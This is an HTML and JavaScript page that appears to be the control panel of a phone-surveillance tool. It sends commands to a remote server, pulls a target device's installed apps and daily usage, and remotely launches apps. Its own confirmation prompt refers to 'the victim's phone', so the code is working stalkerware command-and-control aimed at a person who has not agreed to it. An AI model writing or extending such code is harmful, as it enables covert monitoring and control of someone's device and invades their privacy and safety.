<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Installed Apps</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: #1e293b;
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --accent: #3b82f6;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-primary);
            font-family: 'Poppins', sans-serif;
            padding-bottom: 50px;
        }

        /* Fixed Header */
        .app-header {
            background: rgba(30, 41, 59, 0.95);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            position: sticky;
            top: 0;
            z-index: 1000;
            padding: 15px 0;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }

        /* Search Bar */
        .search-container {
            position: relative;
            margin-top: 10px;
        }
        .search-input {
            background: #334155;
            border: none;
            color: white;
            padding: 12px 45px;
            border-radius: 12px;
            width: 100%;
            font-size: 1rem;
        }
        .search-input:focus {
            background: #475569;
            color: white;
            outline: none;
            box-shadow: 0 0 0 2px var(--accent);
        }
        .search-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-secondary);
        }

        /* App Grid */
        .app-card {
            background: var(--card-bg);
            border-radius: 12px;
            padding: 15px;
            transition: transform 0.2s, background 0.2s;
            border: 1px solid rgba(255, 255, 255, 0.05);
            display: flex;
            align-items: center;
            gap: 15px;
            position: relative;
        }

        .app-card:hover {
            transform: translateY(-3px);
            background: #263345;
            border-color: var(--accent);
        }

        .app-icon {
            width: 55px;
            height: 55px;
            border-radius: 12px;
            object-fit: cover;
            background: #000;
        }

        .app-info {
            flex-grow: 1;
            overflow: hidden;
        }

        .app-name {
            font-weight: 600;
            font-size: 1.05rem;
            margin-bottom: 2px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .pkg-name {
            font-size: 0.75rem;
            color: var(--text-secondary);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .usage-badge {
            font-size: 0.7rem;
            padding: 2px 8px;
            border-radius: 6px;
            background: rgba(59, 130, 246, 0.15);
            color: #60a5fa;
            display: inline-block;
            margin-top: 4px;
        }
        
        .live-dot {
            width: 8px;
            height: 8px;
            background-color: #22c55e;
            border-radius: 50%;
            display: inline-block;
            margin-left: 6px;
            box-shadow: 0 0 5px #22c55e;
        }

        /* Buttons */
        .btn-open {
            background: var(--accent);
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 8px;
            font-size: 0.85rem;
            transition: 0.2s;
        }
        .btn-open:hover {
            background: #2563eb;
        }

        .btn-back {
            color: var(--text-secondary);
            font-size: 1.2rem;
            text-decoration: none;
            margin-right: 15px;
        }
        
        .status-msg {
            text-align: center;
            color: var(--text-secondary);
            margin-top: 50px;
        }
    </style>
</head>
<body>

    <header class="app-header">
        <div class="container">
            <div class="d-flex align-items-center justify-content-between">
                <div class="d-flex align-items-center">
                    <a href="index.html" class="btn-back"><i class="fas fa-arrow-left"></i></a>
                    <h5 class="m-0 fw-bold">Installed Apps</h5>
                </div>
                <button class="btn btn-sm btn-outline-light" onclick="manualRefresh()">
                    <i class="fas fa-sync-alt"></i> <span id="liveText">Connecting...</span>
                </button>
            </div>
            
            <div class="search-container">
                <i class="fas fa-search search-icon"></i>
                <input type="text" id="searchInput" class="search-input" placeholder="Search apps..." onkeyup="filterApps()">
            </div>
        </div>
    </header>

    <div class="container mt-3">
        <div id="appsContainer" class="row g-3">
            </div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com";
        const urlParams = new URLSearchParams(window.location.search);
        // "deviceId" ya "id" dono support karega
        const DEVICE_ID = urlParams.get('id') || urlParams.get('deviceId');
        const storageKey = `apps_${DEVICE_ID}`;
        let cachedApps = []; // For filtering
        let refreshInterval;

        document.addEventListener("DOMContentLoaded", () => {
            if (!DEVICE_ID) {
                alert("ID Missing!");
                window.location.href = "index.html";
                return;
            }
            
            // 1. Pehle saved data dikhao
            loadFromStorage();
            
            // 2. Command bhejo phone ko ki apps bhej
            sendCommand();
            
            // 3. Live update shuru karo
            startLiveUpdates();
        });

        // --- LIVE UPDATE (2 SECONDS) ---
        function startLiveUpdates() {
            fetchApps();
            // Apps ka data bada hota hai isliye 2000ms (2 sec) rakha hai
            refreshInterval = setInterval(() => { fetchApps(); }, 2000); 
        }

        function manualRefresh() {
            document.getElementById("liveText").innerText = "Updating...";
            sendCommand(); // Force resend command
            setTimeout(fetchApps, 1000);
        }

        // --- FETCH & RENDER ---
        function loadFromStorage() {
            const savedData = localStorage.getItem(storageKey);
            if (savedData) {
                const data = JSON.parse(savedData);
                cachedApps = data;
                renderApps(data);
            } else {
                document.getElementById("appsContainer").innerHTML = `<div class="status-msg"><p>Fetching apps list...</p></div>`;
            }
        }

        function sendCommand() {
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'apps' })
            }).catch(e => console.log("Cmd Error", e));
        }

        function fetchApps() {
            const timestamp = new Date().getTime();
            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/apps?t=${timestamp}`)
                .then(response => response.json())
                .then(data => {
                    document.getElementById("liveText").innerText = `LIVE`;
                    if (data && Array.isArray(data) && data.length > 0) {
                        // Naya data aaya toh save karo
                        localStorage.setItem(storageKey, JSON.stringify(data));
                        cachedApps = data;
                        
                        // Sirf tab render karo agar search box khali ho (nahi toh user type karte waqt list hil jayegi)
                        if(document.getElementById('searchInput').value === "") {
                            renderApps(data);
                        }
                    }
                })
                .catch(err => {
                    document.getElementById("liveText").innerText = "Connecting...";
                });
        }

        function renderApps(data) {
            const container = document.getElementById("appsContainer");
            if (!container) return;

            // Sort: Live apps upar, fir usage time ke hisaab se
            data.sort((a, b) => b.usageMinutes - a.usageMinutes);

            if(data.length === 0) {
                container.innerHTML = `<div class="status-msg"><p>No apps found yet.</p></div>`;
                return;
            }

            let html = "";
            
            data.forEach(app => {
                // Icon handling
                let iconSrc = 'img/android_default.png'; // Fallback image path
                if (app.icon && app.icon.length > 20) {
                    iconSrc = `data:image/webp;base64,${app.icon}`;
                }

                // Usage Text
                let usageText = "Not used today";
                if (app.usageMinutes > 0) {
                    const hours = Math.floor(app.usageMinutes / 60);
                    const mins = app.usageMinutes % 60;
                    usageText = hours > 0 ? `${hours}h ${mins}m today` : `${mins}m today`;
                }

                // Live Dot
                let liveTag = app.isLive ? '<span class="live-dot" title="Running Now"></span>' : '';

                html += `
                    <div class="col-12 col-md-6 col-lg-4">
                        <div class="app-card">
                            <img src="${iconSrc}" class="app-icon" alt="App">
                            <div class="app-info">
                                <div class="d-flex align-items-center">
                                    <div class="app-name">${app.appName}</div>
                                    ${liveTag}
                                </div>
                                <div class="pkg-name">${app.packageName}</div>
                                <div class="usage-badge"><i class="far fa-clock"></i> ${usageText}</div>
                            </div>
                            <button class="btn-open" onclick="openRemoteApp('${app.packageName}')">
                                <i class="fas fa-play"></i>
                            </button>
                        </div>
                    </div>
                `;
            });

            container.innerHTML = html;
        }

        // --- SEARCH FUNCTION ---
        function filterApps() {
            const query = document.getElementById('searchInput').value.toLowerCase();
            const filtered = cachedApps.filter(app => 
                (app.appName && app.appName.toLowerCase().includes(query)) || 
                (app.packageName && app.packageName.toLowerCase().includes(query))
            );
            renderApps(filtered);
        }

        // --- OPEN APP COMMAND ---
        function openRemoteApp(pkg) {
            if(!confirm("Open this app on the victim's phone?")) return;
            
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    device_id: DEVICE_ID,
                    command: `open:${pkg}`
                })
            })
            .then(() => alert("Command Sent!"))
            .catch(() => alert("Failed to send command"));
        }
    </script>
</body>
</html>
